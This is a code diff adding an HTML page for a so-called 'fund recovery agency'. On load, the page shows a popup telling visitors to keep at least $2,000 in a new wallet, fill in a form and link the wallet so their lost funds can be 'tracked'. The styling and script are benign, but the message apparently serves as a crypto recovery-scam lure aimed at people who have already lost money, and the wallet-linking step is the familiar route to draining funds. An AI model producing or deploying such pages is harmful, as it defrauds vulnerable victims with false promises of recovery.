@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>fund recovery agency</title>
+<style>
+    /* Style for the overlay */
+    .overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5); /* semi-transparent black */
+        z-index: 10000; /* ensure it's on top of everything */
+        animation: fadeIn 0.5s ease-in-out; /* fade-in animation */
+    }
+    
+    /* Style for the popup box */
+    .popup {
+        position: fixed;
+        width: 90%;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: white;
+        padding: 10px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        z-index: 10000; /* ensure it's on top of the overlay */
+        animation: slideIn 1s ease-in-out; /* slide-in animation */
+    }
+    
+    /* Style for the popup message */
+    .popup-message {
+        font-size: 20px;
+        margin-bottom: 20px;
+    }
+    
+    /* Style for the OK button */
+    .popup-button {
+        padding: 10px 20px;
+        background-color: #007bff; /* blue color */
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+    
+    /* Style for the OK button on hover */
+    .popup-button:hover {
+        background-color: #0056b3; /* darker blue color */
+    }
+    
+    /* Fade-in animation */
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+        }
+        to {
+            opacity: 1;
+        }
+    }
+    
+    /* Slide-in animation */
+    @keyframes slideIn {
+        from {
+            top: -50%;
+        }
+        to {
+            top: 50%;
+        }
+    }
+    </style>
+<script>
+window.onload = function() {
+    // Show the popup when the page is loaded
+    document.getElementById('overlay').style.display = 'block';
+};
+
+function redirectToAnotherPage() {
+    // Redirect to another page when the OK button is clicked
+    document.getElementById('overlay').style.display = 'none'; // Replace "anotherpage.html" with the URL of the page you want to redirect to
+}
+</script>
+</head>
+<body>
+<!-- Overlay -->
+<div id="overlay" class="overlay">
+    <!-- Popup Box -->
+    <div class="popup">
+        <!-- Popup Message -->
+        <div class="popup-message">
+            <h6>Funds recovery process</h6>
+            <p>Follow the steps below to get lost funds back into your new wallet<br>
+            you must have at least $2,000 in your new wallet. For us to be able to track your lost funds click ok, fill in the form,and link your wallet for the recovery process. 
+            </p>
+        </div>
+        <!-- OK Button -->
+        <button class="popup-button" onclick="redirectToAnotherPage()">OK</button>
+    </div>
+</div>
+
+<!-- Content of your page -->
+<!-- You can add your page content here -->
+
+</body>
+</html>
